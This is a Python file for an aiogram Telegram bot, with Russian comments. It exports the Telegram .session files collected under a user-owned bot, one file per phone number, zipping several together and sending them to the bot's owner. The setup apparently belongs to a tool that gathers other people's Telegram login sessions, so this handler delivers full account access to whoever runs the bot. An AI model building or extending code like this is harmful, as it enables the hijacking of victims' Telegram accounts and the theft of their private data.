from __future__ import annotations

import io
import os
import zipfile
from datetime import datetime, timezone

from aiogram import F, Router
from aiogram.types import BufferedInputFile, CallbackQuery

from database import get_bot, get_bot_sessions
from handlers.cards import owns

router = Router()


def _collect_session_files(sessions: list[dict]) -> list[tuple[str, bytes]]:
    """Читает .session файлы с диска. Возвращает [(имя_без_расширения, байты)]."""
    files: list[tuple[str, bytes]] = []
    for s in sessions:
        path = s.get("session_path")
        if not path or not os.path.isfile(path):
            continue
        try:
            with open(path, "rb") as f:
                data = f.read()
        except OSError:
            continue
        phone = (s.get("phone") or "").lstrip("+")
        if not phone:
            phone = os.path.splitext(os.path.basename(path))[0]
        files.append((phone, data))
    return files


@router.callback_query(F.data.startswith("export_sessions:"))
async def export_sessions(callback: CallbackQuery) -> None:
    bot_id = int(callback.data.split(":")[1])
    bot = get_bot(bot_id)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return

    tg_id = bot.get("tg_id")
    sessions = get_bot_sessions(tg_id) if tg_id else []
    if not sessions:
        await callback.answer("Сессий пока нет.", show_alert=True)
        return

    files = _collect_session_files(sessions)
    if not files:
        await callback.answer(
            "Файлы сессий не найдены на диске.", show_alert=True
        )
        return

    uname = (bot.get("username") or f"bot{bot_id}").lstrip("@")

    # Одна сессия — отдаём .session файлом напрямую.
    if len(files) == 1:
        phone, data = files[0]
        await callback.message.answer_document(
            BufferedInputFile(data, filename=f"{phone}.session"),
            caption=f"📥 Сессия — {uname}\nНомер: {phone}",
        )
        await callback.answer()
        return

    # Несколько — упаковываем в zip.
    buf = io.BytesIO()
    used: set[str] = set()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for phone, data in files:
            name = f"{phone}.session"
            i = 1
            while name in used:
                name = f"{phone}_{i}.session"
                i += 1
            used.add(name)
            zf.writestr(name, data)

    stamp = datetime.now(tz=timezone.utc).strftime("%Y%m%d_%H%M%S")
    fname = f"sessions_{uname}_{stamp}.zip"
    await callback.message.answer_document(
        BufferedInputFile(buf.getvalue(), filename=fname),
        caption=f"📥 Сессии — {uname}\nФайлов: {len(files)} из {len(sessions)}",
    )
    await callback.answer()
